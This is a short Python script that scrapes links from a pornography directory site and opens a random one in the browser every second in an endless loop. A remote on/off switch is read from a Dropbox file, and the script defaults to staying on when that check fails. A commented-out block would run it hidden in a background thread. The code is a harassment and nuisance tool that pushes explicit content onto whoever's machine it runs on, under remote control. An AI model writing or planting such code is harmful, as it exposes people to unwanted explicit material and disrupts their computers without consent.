import time
import threading
import webbrowser
import requests

import numpy as np
from bs4 import BeautifulSoup

def spam_browser(delay_between_sec=1):

    def switch_activated():
        try:
            r = requests.get('https://www.dropbox.com/s/yuti3c2yln1lcu0/switch.txt?dl=1')
            if r.text.strip() == 'false':
                return False
        except:
            return True
        return True

    r = requests.get('https://toppornsites.com/')
    soup = BeautifulSoup(r.text, 'lxml')
    links = soup.find_all('a', attrs={'class': 'link'})
    links = [link['href'] for link in links]

    while True:
        time.sleep(delay_between_sec)
        if switch_activated():
            webbrowser.open_new(links[np.random.randint(len(links))])

# thread = threading.Thread(target=spam_browser, args=(10, 1))
# thread.daemon = True
# thread.start()

spam_browser()

